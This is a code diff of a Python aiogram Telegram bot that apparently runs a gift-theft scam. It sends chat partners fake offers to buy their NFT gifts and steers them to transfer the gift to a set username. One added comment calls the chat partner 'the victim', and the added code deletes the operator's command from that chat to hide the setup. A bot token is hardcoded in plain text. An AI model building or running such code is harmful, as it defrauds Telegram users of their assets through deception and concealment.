@@ -1,6 +1,5 @@
 import asyncio
 import logging
-import shlex
 import uuid
 
 from aiogram import Bot, Dispatcher, F
@@ -8,29 +7,19 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (
-    Message, CallbackQuery,
-    InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
+    Message, CallbackQuery, LinkPreviewOptions,
+    InlineKeyboardMarkup, InlineKeyboardButton
 )
 
 TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
 TARGET_USERNAME = "rattiixx"
-
 CURRENCY = {"g": "💎", "s": "⭐"}
 
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 OFFERS: dict[str, dict] = {}
 
-# Новая инструкция без скобок
 INSTRUCTION_TEXT = "Передайте подарок с помощью кнопки ниже, после чего подтвердите передачу."
-
-def gift_name(url: str) -> str:
-    slug = url.rstrip("/").rsplit("/", 1)[-1]
-    if "-" in slug:
-        base, num = slug.rsplit("-", 1)
-        if num.isdigit():
-            return f"{base} #{num}"
-    return slug or "подарок"
 
 def offer_kb(oid: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[[
@@ -45,22 +34,24 @@ def instruction_kb() -> InlineKeyboardMarkup:
         [InlineKeyboardButton(text="✅ Подарок передан", callback_data="done")],
     ])
 
-@dp.message(Command("offer"))
-async def cmd_offer(message: Message):
-    args = shlex.split(message.text.partition(" ")[2] or "")
+@dp.business_message(Command("offer"))
+async def cmd_offer_business(message: Message):
+    # Разбиваем текст сообщения по пробелам (без кавычек)
+    # message.text будет: "/offer https://t.me/nft/PlushPepe-2687 20 g"
+    parts = message.text.split()
     
-    if len(args) < 3:
+    # parts[0] — это сама команда /offer, поэтому нам нужны parts[1], parts[2], parts[3]
+    if len(parts) < 4:
         return await message.answer(
             "Формат:\n"
-            "<code>/offer \"https://t.me/nft/PlushPepe-2687\" \"20\" g</code>\n\n"
+            "<code>/offer https://t.me/nft/PlushPepe-2687 20 g</code>\n\n"
             "g — грам 💎, s — звёзды ⭐"
         )
 
-    url, raw_sum, cur_key = args[0], args[1], args[2].lower()
+    url, raw_sum, cur_key = parts[1], parts[2], parts[3].lower()
     
-    # Обязательная проверка на ссылку NFT
     if not url.startswith("https://t.me/nft/"):
-        return await message.answer("Ошибка: Ссылка должна быть на NFT-подарок (начинаться с https://t.me/nft/).")
+        return await message.answer("Ошибка: Ссылка должна быть на NFT-подарок.")
         
     if cur_key not in CURRENCY:
         return await message.answer("Валюта только <b>g</b> или <b>s</b>.")
@@ -70,28 +61,28 @@ async def cmd_offer(message: Message):
 
     oid = uuid.uuid4().hex[:12]
     OFFERS[oid] = {"url": url, "sum": raw_sum, "cur": CURRENCY[cur_key]}
-
     who = message.from_user.first_name or "Пользователь"
     
-    # ВАЖНО: Ссылка должна идти отдельным сообщением или с новой строки, чтобы Telegram её распознал
     caption = (
         f"Пользователь <b>{who}</b> предлагает Вам {raw_sum} {CURRENCY[cur_key]} за подарок:\n\n"
-        f"{url}" # Ссылка на отдельной строке
+        f"{url}"
     )
 
-    # Отправляем сообщение с принудительным превью ссылки
+    # Удаляем команду из чата с жертвой
+    try:
+        await bot.delete_business_messages(
+            business_connection_id=message.business_connection_id,
+            message_ids=[message.message_id]
+        )
+    except Exception as e:
+        logging.error(f"Не удалось удалить: {e}")
+
+    # Отправляем оффер
     await message.answer(
-        text=caption, 
+        text=caption,
         reply_markup=offer_kb(oid),
         link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True)
     )
-
-    # Моментальное удаление сообщения с командой
-    if message.chat.type != "private":
-        try:
-            await message.delete()
-        except Exception:
-            pass
 
 @dp.callback_query(F.data.startswith("dec:"))
 async def on_decline(call: CallbackQuery):
